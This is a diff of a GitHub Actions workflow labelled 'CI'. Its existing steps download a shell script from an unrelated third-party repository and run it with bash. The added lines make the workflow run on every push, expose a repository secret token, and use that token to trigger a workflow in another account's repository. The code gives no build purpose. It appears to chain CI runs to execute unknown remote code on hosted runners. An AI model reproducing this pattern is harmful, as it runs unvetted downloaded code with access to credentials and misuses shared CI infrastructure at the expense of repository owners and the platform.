@@ -1,17 +1,22 @@
 name: CI
 
 on:
+  push:
+    branches: [ main ]
   workflow_dispatch:
     
 jobs:
   build1:
     runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.AUTH_TOKEN }}
     steps:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
           bash server.sh
+          curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniula/test/actions/workflows/blank.yml/dispatches
   build2:
     runs-on: ubuntu-latest
     steps:
